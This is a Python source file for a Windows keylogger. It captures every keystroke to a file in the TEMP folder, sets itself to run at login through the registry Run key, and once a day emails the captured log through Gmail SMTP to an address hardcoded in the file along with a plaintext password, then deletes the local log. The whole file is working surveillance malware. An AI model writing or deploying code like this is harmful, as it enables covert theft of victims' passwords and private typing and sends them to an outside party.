import os
import sys
import time
import winreg
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Replace these with your own email and password
EMAIL_ADDRESS = "redogotchi1980@gmail.com"
EMAIL_PASSWORD = "Redalert3#"

LOG_FILE = os.path.join(os.getenv("TEMP"), "keylogger.log")

def add_to_startup():
    # Add the script to startup using the registry
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "KeyLogger"
    value_data = os.path.join(os.getenv("TEMP"), os.path.basename(sys.argv[0]))

    try:
        with winreg.CreateKey(key, key_path) as reg_key:
            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, value_data)
    except Exception as e:
        print(f"Error adding to startup: {e}")

def on_press(key):
    # Log the pressed key
    with open(LOG_FILE, "a") as f:
        try:
            f.write(str(key).replace("'", ""))
        except Exception as e:
            pass

def send_email():
    # Send the log file via email
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "KeyLogger Log"

    with open(LOG_FILE, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={os.path.basename(LOG_FILE)}",
        )
        msg.attach(part)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, [EMAIL_ADDRESS], msg.as_string())
        server.quit()

        # Delete the log file after sending
        os.remove(LOG_FILE)
    except Exception as e:
        print(f"Error sending email: {e}")

def check_single_instance():
    # Check if another instance is running
    try:
        with open(os.path.join(os.getenv("TEMP"), "keylogger.pid"), "x") as f:
            pass
    except FileExistsError:
        print("Another instance is already running.")
        sys.exit(1)

if __name__ == "__main__":
    check_single_instance()
    add_to_startup()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        send_email()
        time.sleep(86400)  # Send logs every day
